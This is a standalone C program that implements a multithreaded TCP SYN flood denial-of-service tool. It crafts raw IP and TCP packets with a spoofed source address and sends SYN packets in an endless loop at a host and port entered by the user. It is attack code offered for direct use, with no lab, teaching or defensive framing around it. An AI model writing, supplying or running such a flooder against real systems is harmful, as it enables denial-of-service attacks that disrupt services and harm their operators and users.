#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>

// IP header structure
struct ipheader {
    unsigned char      iph_ihl:5, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_flag:3, iph_offset:13;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    struct  in_addr    iph_sourceip;
    struct  in_addr    iph_destip;
};

// TCP header structure
struct tcpheader {
    unsigned short int tcph_srcport;
    unsigned short int tcph_destport;
    unsigned int       tcph_seqnum;
    unsigned int       tcph_acknum;
    unsigned char      tcph_reserved:4, tcph_offset:4;
    unsigned char      tcph_flags;
    unsigned short int tcph_win;
    unsigned short int tcph_chksum;
    unsigned short int tcph_urgptr;
};

// Checksum function for IP and TCP headers
unsigned short calculate_checksum(unsigned short *paddress, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *paddress++;
        len -= 2;
    }
    if (len > 0) {
        sum += *(unsigned char*)paddress;
    }
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (unsigned short)(~sum);
}

// Struct to pass arguments to each thread
struct flood_args {
    char *target_ip;
    int target_port;
};

// Function to handle Ctrl+C signal
void handle_interrupt(int signal) {
    printf("TCP SYN Flood stopped.\n");
    exit(0);
}

// Function to perform the SYN flood attack
void *tcpSynFlood(void *args) {
    struct flood_args *fargs = (struct flood_args *) args;
    char *target_ip = fargs->target_ip;
    int target_port = fargs->target_port;

    int sock;
    char packet[4096];
    struct ipheader *iph = (struct ipheader *) packet;
    struct tcpheader *tcph = (struct tcpheader *) (packet + sizeof(struct ipheader));
    struct sockaddr_in dest;
    int one = 1;
    const int *val = &one;

    // Create a raw socket
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Set socket options
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Error setting socket options");
        pthread_exit(NULL);
    }

    // Set destination information
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target_port);
    dest.sin_addr.s_addr = inet_addr(target_ip);

    // Attach signal handler to stop flooding on Ctrl+C
    signal(SIGINT, handle_interrupt);

    printf("Thread started: Flooding %s:%d\n", target_ip, target_port);

    // Flood the target with SYN packets until interrupted
    while (1) {
        // Fill in IP Header fields
        iph->iph_ver = 4;
        iph->iph_ihl = 5;
        iph->iph_tos = 0;
        iph->iph_len = sizeof(struct ipheader) + sizeof(struct tcpheader);
        iph->iph_ident = htons(rand());
        iph->iph_ttl = 255;
        iph->iph_protocol = IPPROTO_TCP;
        iph->iph_sourceip.s_addr = inet_addr("192.168.1.1"); // Fake source IP
        iph->iph_destip.s_addr = inet_addr(target_ip);

        // Fill in TCP Header fields
        tcph->tcph_srcport = htons(rand() % 65535);
        tcph->tcph_destport = htons(target_port);
        tcph->tcph_seqnum = htonl(rand());
        tcph->tcph_acknum = 0;
        tcph->tcph_offset = 5;  // TCP header size
        tcph->tcph_flags = TH_SYN;  // SYN flag set
        tcph->tcph_win = htons(65535);
        tcph->tcph_chksum = 0;
        tcph->tcph_urgptr = 0;

        // Set IP checksum
        iph->iph_chksum = calculate_checksum((unsigned short *) packet, iph->iph_len >> 1);

        // Send the packet
        if (sendto(sock, packet, iph->iph_len, 0, (struct sockaddr *) &dest, sizeof(dest)) < 0) {
            perror("Failed to send packet");
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main() {
    char target_ip[100];
    int target_port;
    int thread_count;

    // Get remote host IP address and port from user
    printf("Enter the remote host's IP address: ");
    scanf("%s", target_ip);
    printf("Enter the remote host's port: ");
    scanf("%d", &target_port);
    printf("Enter the number of threads to use: ");
    scanf("%d", &thread_count);

    // Allocate space for thread identifiers
    pthread_t threads[thread_count];
    struct flood_args fargs;
    fargs.target_ip = target_ip;
    fargs.target_port = target_port;

    // Start each thread
    for (int i = 0; i < thread_count; i++) {
        if (pthread_create(&threads[i], NULL, tcpSynFlood, (void *) &fargs) != 0) {
            perror("Failed to create thread");
        }
    }

    // Wait for all threads to finish (which won't happen unless interrupted)
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
